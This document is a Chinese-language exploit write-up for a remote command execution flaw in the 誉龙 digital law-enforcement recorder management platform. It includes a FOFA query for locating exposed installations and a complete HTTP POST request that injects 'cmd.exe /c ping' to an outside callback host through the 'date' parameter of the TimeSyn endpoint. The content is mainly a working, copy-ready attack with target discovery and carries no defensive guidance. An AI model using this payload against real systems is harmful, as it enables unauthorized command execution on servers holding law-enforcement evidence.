# 誉龙数字执法记录仪管理平台 TimeSyn 远程命令执行

# 一、漏洞简介
誉龙数字执法记录仪管理平台是深圳誉龙数字技术有限公司开发的执法记录仪管理平台，该平台存在远程命令执行漏洞，攻击者可以利用该漏洞执行任意命令，这可能导致对系统进行未经授权的操作，例如创建、修改或删除文件、执行系统命令、安装恶意软件等。

# 二、影响版本
+ 誉龙数字执法记录仪管理平台

# 三、资产测绘
+ fofa`body="PView 视音频管理平台"`
+ 特征

![1726295881688-5a934d40-ff14-4e0a-87a0-2dec0b87f3c3.png](./img/Z2u3bzlmVxpGXETB/1726295881688-5a934d40-ff14-4e0a-87a0-2dec0b87f3c3-660762.png)

# 四、漏洞复现
```go
POST /index.php?r=Third/TimeSyn HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Host: 
Cookie: JSESSIONID=AB3CC11444E566879F70BE78C0C518CA
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 96

cloudKey=0x0&date=|cmd.exe+/c+ping jzogguorui.dgrh3.cn&time=1
```

![1726295898690-b6f838cb-5df3-42e7-810e-04a9292c7545.png](./img/Z2u3bzlmVxpGXETB/1726295898690-b6f838cb-5df3-42e7-810e-04a9292c7545-933245.png)



> 更新: 2024-10-22 09:36:10  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tory9ats6o7dd65g>